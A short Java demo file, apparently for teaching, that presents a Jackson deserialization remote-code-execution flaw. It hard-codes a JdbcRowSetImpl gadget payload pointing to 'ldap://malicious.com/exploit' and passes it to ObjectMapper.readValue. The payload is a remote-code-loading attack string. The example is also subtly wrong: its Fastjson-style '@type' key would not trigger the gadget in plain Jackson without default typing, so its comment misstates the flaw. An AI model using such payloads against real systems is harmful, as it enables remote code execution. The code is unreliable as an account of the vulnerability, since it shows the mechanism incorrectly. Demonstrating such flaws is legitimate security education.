import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class VulnerableApp {
    public static void main(String[] args) {
        String json = "{ \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://malicious.com/exploit\", \"autoCommit\": true }";
        ObjectMapper mapper = new ObjectMapper();
        
        try {
            Object obj = mapper.readValue(json, Object.class); // 🚨 Vulnerável a RCE em versões antigas do Jackson
            System.out.println(obj);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
